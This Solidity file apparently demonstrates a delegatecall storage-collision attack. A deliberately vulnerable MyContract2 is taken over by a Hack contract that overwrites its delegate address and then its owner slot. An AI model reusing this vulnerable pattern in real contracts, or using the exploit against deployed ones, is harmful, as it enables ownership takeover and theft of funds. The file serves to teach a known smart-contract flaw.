// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract MyContract {
    // vars should be in exact order as in AnotherContract because assigns will by slots index and not by name
    address public sender;
    uint public amount;
    address otherContract;

    constructor(address _other) {
        otherContract = _other;
    }

    function delegatedCall() external payable {
        (bool success, ) = otherContract.delegatecall(
            abi.encodeWithSelector(AnotherContract.getData.selector)
        );
        require(success, "Something went wrong");
    }
}

contract AnotherContract {
    address public sender;
    uint public amount;
    event Received(address sender, uint value);

    function getData() external payable {
        sender = msg.sender;
        amount = msg.value;
        emit Received(msg.sender, msg.value); // this function will be called with context of MyContract
    }
}

contract Hack {
    address public otherContract;
    address public owner;

    MyContract2 public toHack;

    constructor(address payable _to) {
        owner = msg.sender;
        toHack = MyContract2(_to);
    }

    function attack() external {
        toHack.delegatedCall(uint(uint160(address(this))));
        //  timestemp will trying to set at in AnotherContract2 but with context it will set it in otherContract in MyContract2
        // so Hack contract will be set to MyContract2 as otherContract and we can catch delegatedCall
        toHack.delegatedCall(0); // now we will call getData in Hack contract
    }

    function getData(uint _t) external payable {
        owner = msg.sender; // now owner has 2 slot in Hack contract and 2 slot in MyContract2 wich means tha we'll rewrite owner
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}

contract MyContract2 {
    address public otherContract;
    address public owner;
    uint public at;
    // vars should be in exact order as in AnotherContract because assigns will by slots index and not by name
    address public sender;
    uint public amount;

    constructor(address _other) {
        otherContract = _other;
        owner = msg.sender;
    }

    function delegatedCall(uint timestamp) external payable {
        (bool success, ) = otherContract.delegatecall(
            abi.encodeWithSelector(AnotherContract2.getData.selector, timestamp)
        );
        require(success, "Something went wrong");
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}

contract AnotherContract2 {
    uint public at;
    address public sender;
    uint public amount;
    event Received(address sender, uint value);

    function getData(uint timestamp) external payable {
        at = timestamp;
        sender = msg.sender;
        amount = msg.value;
        emit Received(msg.sender, msg.value); // this function will be called with context of MyContract
    }
}
